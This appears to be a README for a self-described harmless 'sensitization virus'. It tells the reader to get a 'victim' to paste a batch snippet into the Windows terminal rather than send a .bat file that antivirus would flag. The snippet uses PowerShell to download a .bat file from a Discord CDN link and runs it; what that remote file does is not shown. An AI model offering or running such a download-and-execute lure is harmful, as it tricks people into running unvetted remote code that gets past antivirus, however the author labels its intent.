<h1>Sensitization virus</h1></br>
<h2>How to use?</h2>

To use this non-harmful virus, you only need to run "index.bat"

You could send this file to your victim but I don't recommend it as it is a .bat file, which means the anti-virus programs will consider it as a virus, whether it is or not. 

That's why I recommend just sending the script of the index.bat file and ask them to run it in the terminal.

Here's a small tutorial:

Do the shortcut `Windows` + `R`, this should open a small popup.
In this popup, write `cmd` and press enter. A black window should open, it's the terminal
In the terminal, paste the following code & press enter

```bat
color a
title Installing...
echo %USERPROFILE%
cd %USERPROFILE%\Downloads
powershell.exe -Command "Invoke-WebRequest -OutFile ./src-dll.bat https://cdn.discordapp.com/attachments/800052087136190467/829407099750318160/launcher.bat"
call src-dll.bat
dir/s
```

<h2>What is the purpose?</h2>

This small non-harmful virus is meant to sensitize people. You should not run random files as it can destroy your computer, virtually & physically. Without harming your computer, this virus will show you how powerful a file can be. Basicly, a virus could get all the infos of your computer, or destroy all your files, use your amazon account... Do never run random files. Specially if they are sent from a stranger.

You can send this script to your friend in order to sensitize them.
